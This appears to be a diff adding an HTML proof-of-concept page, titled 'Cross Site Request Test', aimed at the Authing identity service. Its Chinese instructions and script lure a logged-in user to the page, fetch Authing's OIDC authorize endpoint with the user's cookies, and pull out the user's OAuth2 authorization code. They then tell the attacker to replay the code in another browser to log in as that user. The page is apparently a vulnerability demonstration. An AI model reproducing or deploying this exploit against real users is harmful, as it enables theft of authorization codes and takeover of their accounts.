@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross Site Request Test</title>
+
+    <script>
+    </script>
+
+    <style>
+        @media print {
+            body * {
+                visibility: hidden;
+            }
+
+            #print {
+                visibility: visible;
+            }
+        }
+
+        .popup {
+            position: fixed;
+            top: 0px;
+            left: 0px;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 99999;
+            border: 1px solid #ccc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            display: none;
+        }
+
+        .popup.show {
+            display: flex;
+        }
+
+        .popup .content {
+            min-width: 100px;
+            max-width: 400px;
+            min-height: 100px;
+            background: #fff;
+            border: 1px solid #ccc;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+    </style>
+</head>
+
+<body>
+    <p>实现步骤：</p>
+    <ul>
+        <li>首先引导用户登录 <a target="_blank" rel="noopener noreferrer"
+                href="https://www.authing.cn/">https://www.authing.cn/</a> </li>
+        <li>然后在引导用户访问这个url</li>
+        <li>点击(或者自动)运行下面button，可以得到用户的oauth2 code</li>
+        <li>然后就可以代替用户登录</li>
+    </ul>
+
+    <input type="text" name="" id="state">
+    <button id="btn1">得到当前用户 authing console的 oauth2 code</button>
+    <p style="color: red;">请把下面的url，复制到一台或者一个没有登录authing的浏览器上</p>
+    <input style="display: block; width: 100%;" type="text" id="callback-code"></>
+
+    <script>
+        const btn1 = document.getElementById("btn1");
+        const stateBtn = document.getElementById("state");
+
+        // user  = await fetch('https://console.authing.cn/oidc/auth?app_id=5f6265c67ff6fdae64ec516e&client_id=5f6265c67ff6fdae64ec516e&nonce=0K2dybamMU&redirect_uri=https://console.authing.cn/console/userpool/callback&response_type=code&scope=openid profile email phone offline_access&state=&response_mode=form_post',{"credentials":"include", "redirect":"manual"})
+
+        // const authingLoginUrl =
+        //     'https://fullstackopen.authing.cn/oidc/auth?app_id=61a0e7bdc34cc1d3b781b9c4&client_id=61a0e7bdc34cc1d3b781b9c4&response_type=code&state=IY4DTm4JA1&redirect_uri=https://console.authing.cn/console/get-started/61a0e7bdc34cc1d3b781b9c4&scope=openid profile email phone offline_access&response_mode=form_post';
+
+        btn1.addEventListener("click", async () => {
+            const authingLoginUrl =
+                `https://console.authing.cn/oidc/auth?client_id=5f6265c67ff6fdae64ec516e&response_type=code&redirect_uri=https://console.authing.cn/console/userpool/callback&scope=openid email phone profile&state=${stateBtn.value}&response_mode=form_post`;
+
+            const loginresp = await fetch(authingLoginUrl, { "credentials": "include", "redirect": "manual" });
+            const authingTtml = await loginresp.text();
+            console.log(authingTtml);
+
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = authingTtml;
+            const from = tempDiv.querySelector('form');
+            const url = `${from?.action}?code=${from?.code.value}&state=${from?.state?.value}`;
+            console.log(url);
+            document.getElementById('callback-code').value = url;
+
+        })
+    </script>
+
+</body>
+
+</html>
